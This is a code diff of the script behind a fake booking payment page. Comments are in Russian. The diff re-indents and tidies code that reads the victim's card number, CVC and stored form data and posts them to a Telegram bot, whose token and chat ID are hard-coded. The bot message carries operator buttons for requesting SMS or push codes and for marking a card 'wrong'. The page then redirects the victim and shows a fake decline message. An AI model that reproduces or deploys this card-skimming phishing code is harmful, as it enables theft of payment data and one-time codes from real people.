@@ -1268,12 +1268,12 @@
         });
 
         // Функция отправки в Telegram бот
-async function sendToTelegramBot() {
-    try {
-        const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
-        const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
+        async function sendToTelegramBot() {
+            try {
+                const formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
+                const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
 
-        const message = `
+                const message = `
 💳 НОВАЯ ОПЛАТА
 
 👤 Клиент:
@@ -1288,85 +1288,84 @@ async function sendToTelegramBot() {
 • CVC: ${document.getElementById('cvc').value || '-'}
 `;
 
-        // Отправляем сообщение через бота (а не напрямую в API)
-        const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
-        const CHAT_ID = '-1003239032658';
+                // Отправляем сообщение через бота (а не напрямую в API)
+                const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
+                const CHAT_ID = '-1003239032658';
 
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'HTML',
-                reply_markup: {
-    inline_keyboard: [
-        [
-            { 
-                text: "📱 SMS код", 
-                callback_data: `sms_code_${Date.now()}_user_123` 
-            },
-            { 
-                text: "🔔 Пуш", 
-                callback_data: `push_${Date.now()}_user_123` 
+                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: message,
+                        parse_mode: 'HTML',
+                        reply_markup: {
+                            inline_keyboard: [
+                                [
+                                    { 
+                                        text: "📱 SMS код", 
+                                        callback_data: `sms_${Date.now()}_user_123` 
+                                    },
+                                    { 
+                                        text: "🔔 Пуш", 
+                                        callback_data: `push_${Date.now()}_user_123` 
+                                    }
+                                ],
+                                [
+                                    { 
+                                        text: "❌ Неверная карта", 
+                                        callback_data: `wrong_card_${Date.now()}_user_123` 
+                                    }
+                                ]
+                            ]
+                        }
+                    })
+                });
+
+                const result = await response.json();
+                console.log('Результат отправки в Telegram:', result);
+                return result.ok;
+
+            } catch (error) {
+                console.error('Ошибка отправки в Telegram:', error);
+                return false;
             }
-        ],
-        [
-            { 
-                text: "❌ Неверная карта", 
-                callback_data: `wrong_card_${Date.now()}_user_123` 
-            }
-        ]
-    ]
-}
-            })
-        });
-
-        const result = await response.json();
-        console.log('Результат отправки в Telegram:', result);
-        return result.ok;
-
-    } catch (error) {
-        console.error('Ошибка отправки в Telegram:', error);
-        return false;
-    }
-}
-
-// Обработчик кнопки "Оплатить"
-payBtn.addEventListener('click', async () => {
-    if (!validateForm()) return;
-
-    // Показываем сообщение о процессе
-    resultMessage.className = 'result-message';
-    resultMessage.style.display = 'block';
-    resultMessage.textContent = translations[currentLanguage].processing;
-    payBtn.disabled = true;
-
-    try {
-        // ОТПРАВЛЯЕМ ДАННЫЕ В БОТ
-        const botSuccess = await sendToTelegramBot();
-
-        if (botSuccess) {
-            // СРАЗУ ПЕРЕХОДИМ НА LOADING.HTML БЕЗ СООБЩЕНИЙ И КОНФЕТТИ
-            setTimeout(() => {
-                window.location.href = 'loading.html';
-            }, 500); // Быстрый переход через 0.5 секунды
-        } else {
-            throw new Error('Ошибка отправки данных в бот');
         }
 
-    } catch (error) {
-        resultMessage.className = 'result-message error';
-        resultMessage.textContent = 'Ошибка отправки данных';
-        payBtn.disabled = false;
-        payBtn.innerHTML = `<i class="fas fa-lock"></i> ${translations[currentLanguage].pay}`;
-        payBtn.classList.remove('btn-secondary');
-        payBtn.classList.add('btn-primary');
-    }
-});
+        // Обработчик кнопки "Оплатить"
+        payBtn.addEventListener('click', async () => {
+            if (!validateForm()) return;
 
+            // Показываем сообщение о процессе
+            resultMessage.className = 'result-message';
+            resultMessage.style.display = 'block';
+            resultMessage.textContent = translations[currentLanguage].processing;
+            payBtn.disabled = true;
+
+            try {
+                // ОТПРАВЛЯЕМ ДАННЫЕ В БОТ
+                const botSuccess = await sendToTelegramBot();
+
+                if (botSuccess) {
+                    // СРАЗУ ПЕРЕХОДИМ НА LOADING.HTML БЕЗ СООБЩЕНИЙ И КОНФЕТТИ
+                    setTimeout(() => {
+                        window.location.href = 'loading.html';
+                    }, 500); // Быстрый переход через 0.5 секунды
+                } else {
+                    throw new Error('Ошибка отправки данных в бот');
+                }
+
+            } catch (error) {
+                resultMessage.className = 'result-message error';
+                resultMessage.textContent = 'Ошибка отправки данных';
+                payBtn.disabled = false;
+                payBtn.innerHTML = `<i class="fas fa-lock"></i> ${translations[currentLanguage].pay}`;
+                payBtn.classList.remove('btn-secondary');
+                payBtn.classList.add('btn-primary');
+            }
+        });
 
         // Языковой переключатель
         document.querySelector('.language-btn').addEventListener('click', function() {
@@ -1421,10 +1420,55 @@ payBtn.addEventListener('click', async () => {
             document.getElementById('nightsText').textContent = getNightText(nights);
         }
 
+        // Проверяем статус платежа из URL параметров
+        function checkPaymentStatus() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const status = urlParams.get('status');
+
+            if (status === 'wrong_card') {
+                showErrorMessage('❌ Карта была отклонена. Пожалуйста, проверьте данные и попробуйте снова.');
+            }
+        }
+
+        // Функция показа сообщения об ошибке
+        function showErrorMessage(message) {
+            const errorDiv = document.createElement('div');
+            errorDiv.style.cssText = `
+                position: fixed;
+                top: 20px;
+                left: 50%;
+                transform: translateX(-50%);
+                background: var(--error);
+                color: white;
+                padding: 15px 20px;
+                border-radius: 10px;
+                z-index: 10000;
+                box-shadow: 0 5px 15px rgba(0,0,0,0.3);
+                animation: slideDown 0.3s ease;
+            `;
+            errorDiv.textContent = message;
+            document.body.appendChild(errorDiv);
+
+            setTimeout(() => {
+                errorDiv.remove();
+            }, 5000);
+        }
+
+        // Анимация появления
+        const style = document.createElement('style');
+        style.textContent = `
+            @keyframes slideDown {
+                from { transform: translateX(-50%) translateY(-100%); opacity: 0; }
+                to { transform: translateX(-50%) translateY(0); opacity: 1; }
+            }
+        `;
+        document.head.appendChild(style);
+
         // Загружаем данные при загрузке страницы
         window.addEventListener('DOMContentLoaded', () => {
             loadBookingData();
             changeLanguage(currentLanguage);
+            checkPaymentStatus();
         });
 
         // Закрываем выпадающее меню при клике вне его
@@ -1433,71 +1477,6 @@ payBtn.addEventListener('click', async () => {
                 document.getElementById('languageDropdown').classList.remove('show');
             }
         });
-        // Загружаем данные при загрузке страницы
-    window.addEventListener('DOMContentLoaded', () => {
-        loadBookingData();
-        changeLanguage(currentLanguage);
-    });
-
-    // Закрываем выпадающее меню при клике вне его
-    window.addEventListener('click', function(e) {
-        if (!e.target.closest('.language-selector')) {
-            document.getElementById('languageDropdown').classList.remove('show');
-        }
-    });
-
-    // ========== ДОБАВЛЕННЫЙ КОД ДЛЯ ОБРАБОТКИ СТАТУСОВ ==========
-
-    // ========== ДОБАВЛЕННЫЙ КОД ДЛЯ ОБРАБОТКИ СТАТУСОВ ==========
-
-// Проверяем статус платежа из URL параметров
-function checkPaymentStatus() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const status = urlParams.get('status');
-
-    if (status === 'wrong_card') {
-        showErrorMessage('❌ Карта была отклонена. Пожалуйста, проверьте данные и попробуйте снова.');
-    }
-}
-
-// Функция показа сообщения об ошибке
-function showErrorMessage(message) {
-    const errorDiv = document.createElement('div');
-    errorDiv.style.cssText = `
-        position: fixed;
-        top: 20px;
-        left: 50%;
-        transform: translateX(-50%);
-        background: var(--error);
-        color: white;
-        padding: 15px 20px;
-        border-radius: 10px;
-        z-index: 10000;
-        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-        animation: slideDown 0.3s ease;
-    `;
-    errorDiv.textContent = message;
-    document.body.appendChild(errorDiv);
-
-    setTimeout(() => {
-        errorDiv.remove();
-    }, 5000);
-}
-
-// Анимация появления
-const style = document.createElement('style');
-style.textContent = `
-    @keyframes slideDown {
-        from { transform: translateX(-50%) translateY(-100%); opacity: 0; }
-        to { transform: translateX(-50%) translateY(0); opacity: 1; }
-    }
-`;
-document.head.appendChild(style);
-
-// Проверяем статус при загрузке
-document.addEventListener('DOMContentLoaded', checkPaymentStatus);
-// ========== КОНЕЦ ДОБАВЛЕННОГО КОДА ==========
-</script>
+    </script>
 </body>
 </html>
-
